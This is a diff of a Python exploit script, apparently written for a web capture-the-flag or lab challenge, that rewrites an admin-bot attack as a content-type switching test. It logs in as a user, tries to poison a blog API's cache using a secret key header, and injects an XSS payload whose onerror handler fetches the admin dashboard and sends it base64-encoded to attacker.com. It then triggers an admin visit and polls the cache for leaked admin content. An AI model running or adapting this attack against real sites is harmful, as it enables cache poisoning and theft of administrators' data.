@@ -12,73 +12,114 @@ def login_user(username="user", password="user123"):
     r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
     return r.json()['token']
 
-def test_admin_visit_exploit():
+def test_content_switching():
     user_token = login_user()
     print(f"[+] Got user token: {user_token[:20]}...")
 
-    # Step 1: Set up cache poisoning for post 1
-    print("\n[1] Setting up cache poison...")
-    poison_headers = {
+    print("\n=== Testing Content-Type Switching ===")
+
+    # Test 1: Normal JSON request (baseline)
+    print("\n[1] Normal JSON request:")
+    json_headers = {
         'Authorization': f'Bearer {user_token}',
         'X-Special-Key': 'secret_cache_key',
-        'Content-Type': 'text/html',  # Try to force HTML interpretation
+        'Accept': 'application/json'
+    }
+    r1 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=json_headers)
+    print(f"Status: {r1.status_code}")
+    print(f"Content-Type: {r1.headers.get('Content-Type')}")
+    print(f"Response preview: {r1.text[:200]}")
+
+    # Test 2: HTML request
+    print("\n[2] HTML request:")
+    html_headers = {
+        'Authorization': f'Bearer {user_token}',
+        'X-Special-Key': 'secret_cache_key',
         'Accept': 'text/html'
     }
-    
-    # Make the request to ensure it's cached
-    r1 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=poison_headers)
-    print(f"Cache setup status: {r1.status_code}")
-    print(f"Cache: {r1.headers.get('X-Cache-Debug')}")
-    
-    # Verify it's in cache
-    time.sleep(1)
-    r2 = requests.get(f"{SERVER_URL}/api/blog/post/1", 
-                     headers={'X-Special-Key': 'secret_cache_key'})
-    print(f"Cache verification status: {r2.status_code}")
-    print(f"Cache hit: {r2.headers.get('X-Cache-Debug')}")
+    r2 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=html_headers)
+    print(f"Status: {r2.status_code}")
+    print(f"Content-Type: {r2.headers.get('Content-Type')}")
+    print(f"Response preview: {r2.text[:200]}")
+    print(f"Response different from JSON: {r1.text != r2.text}")
 
-    # Step 2: Report the post to trigger admin visit
-    print("\n[2] Triggering admin visit...")
-    report_data = {"postId": 1}  # Use valid integer ID
-    r3 = requests.post(
+    # Test 3: Verify caching of HTML content
+    print("\n[3] Verifying HTML content cache:")
+    time.sleep(1)
+    r3 = requests.get(
+        f"{SERVER_URL}/api/blog/post/1",
+        headers={'X-Special-Key': 'secret_cache_key', 'Accept': 'text/html'}
+    )
+    print(f"Status: {r3.status_code}")
+    print(f"Cache: {r3.headers.get('X-Cache-Debug')}")
+    print(f"Content-Type: {r3.headers.get('Content-Type')}")
+    print(f"Cache working: {r2.text == r3.text}")
+
+    # Test 4: Try XSS payload
+    print("\n[4] Testing XSS payload:")
+    xss_headers = {
+        'Authorization': f'Bearer {user_token}',
+        'X-Special-Key': 'secret_cache_key',
+        'Accept': 'text/html',
+        'Content-Type': 'text/html'
+    }
+    xss_payload = '<img src=x onerror="fetch(\'/api/admin/dashboard\').then(r=>r.text()).then(t=>fetch(\'http://attacker.com?token=\'+btoa(t)))">'
+    
+    # Try to inject XSS through different methods
+    test_paths = [
+        f"{SERVER_URL}/api/blog/post/1",
+        f"{SERVER_URL}/api/blog/post/1?inject={xss_payload}",
+        f"{SERVER_URL}/api/blog/post/1#{xss_payload}"
+    ]
+
+    for path in test_paths:
+        print(f"\nTrying path: {path}")
+        r = requests.get(path, headers=xss_headers)
+        print(f"Status: {r.status_code}")
+        print(f"Content-Type: {r.headers.get('Content-Type')}")
+        print(f"Response contains <img: {'<img' in r.text}")
+        print(f"Response preview: {r.text[:200]}")
+
+        # Verify cache
+        time.sleep(1)
+        verify = requests.get(
+            path, 
+            headers={'X-Special-Key': 'secret_cache_key', 'Accept': 'text/html'}
+        )
+        print(f"\nCache verification:")
+        print(f"Cache: {verify.headers.get('X-Cache-Debug')}")
+        print(f"Content-Type: {verify.headers.get('Content-Type')}")
+        print(f"XSS payload in cache: {'<img' in verify.text}")
+
+    # Test 5: Report post to trigger admin visit
+    print("\n[5] Triggering admin visit:")
+    report_data = {"postId": 1}
+    r = requests.post(
         f"{SERVER_URL}/api/blog/report",
         headers={'Authorization': f'Bearer {user_token}'},
         json=report_data
     )
-    print(f"Report status: {r3.status_code}")
+    print(f"Report status: {r.status_code}")
 
-    # Step 3: Quick requests to try to catch admin response in cache
-    print("\n[3] Attempting to catch admin response...")
-    
-    # Store seen responses to detect changes
-    seen_responses = set()
+    # Monitor cache for a few seconds
+    print("\nMonitoring cache for admin visit...")
     start_time = time.time()
-    
-    while time.time() - start_time < 10:  # Try for 10 seconds
-        # Try different cache key variations
-        for key in ['secret_cache_key', f'secret_cache_key_{int(time.time())}']:
-            r = requests.get(
-                f"{SERVER_URL}/api/blog/post/1",
-                headers={
-                    'X-Special-Key': key,
-                    'Accept': 'text/html',
-                }
-            )
-            
-            content = r.text
-            if content not in seen_responses:
-                print(f"\nNew response found with key {key}!")
-                print(f"Length: {len(content)}")
-                print(f"Preview: {content[:200]}")
-                seen_responses.add(content)
-                
-                # Check if we got admin content
-                if 'admin' in content.lower() and 'token' in content.lower():
-                    print("! Possible admin content found !")
-                    print(f"Full response: {content}")
-            
-            time.sleep(0.2)
+    seen_responses = set()
+
+    while time.time() - start_time < 10:
+        r = requests.get(
+            f"{SERVER_URL}/api/blog/post/1",
+            headers={'X-Special-Key': 'secret_cache_key', 'Accept': 'text/html'}
+        )
+        content = r.text
+        if content not in seen_responses:
+            print("\nNew response found!")
+            print(f"Content-Type: {r.headers.get('Content-Type')}")
+            print(f"Length: {len(content)}")
+            print(f"Preview: {content[:200]}")
+            seen_responses.add(content)
+        time.sleep(0.5)
 
 if __name__ == "__main__":
-    print("[+] Starting admin visit exploitation...")
-    test_admin_visit_exploit()  
+    print("[+] Starting content-type switching test...")
+    test_content_switching()
